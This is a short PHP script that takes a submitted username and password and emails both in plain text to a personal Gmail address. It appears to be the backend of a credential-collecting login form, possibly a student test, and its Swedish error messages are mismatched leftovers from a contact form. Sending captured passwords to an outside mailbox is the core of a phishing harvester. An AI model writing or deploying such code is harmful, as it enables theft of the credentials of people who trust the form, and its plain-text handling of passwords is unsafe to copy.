<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {


            $username = htmlspecialchars($_POST["username"]);
            $password = htmlspecialchars($_POST["password"]);
    
            $from = "noreply@adamkumlin.se";
            $to = "skola.adamkumlin99@gmail.com";
    
            $subject = "test";
    
            $headers = "From: $from\n";
    
            $message = "Namn: $username\n Lösenord: $password";
    
            if (empty($username)) {
                            
                echo "<h2>Vänligen använd endast bokstäver (A-Ö) och mellanslag i namnrutan.</h2>";

            } elseif (empty($password)) {
                            
                echo "<h2>Vänligen använd inga länkar i meddelanderutan.</h2>";

            } else {
    
                $mail_sent = mail($to,$subject,$message,$headers);
            }
    
            if ($mail_sent) {
    
                http_response_code(200);
                
                echo "<h2>skickat</h2>";
            } else {
                http_response_code(500);
    
                echo "<h2>Något gick fel. Ditt meddelande skickades inte.</h2>";
            }
        }

    ?>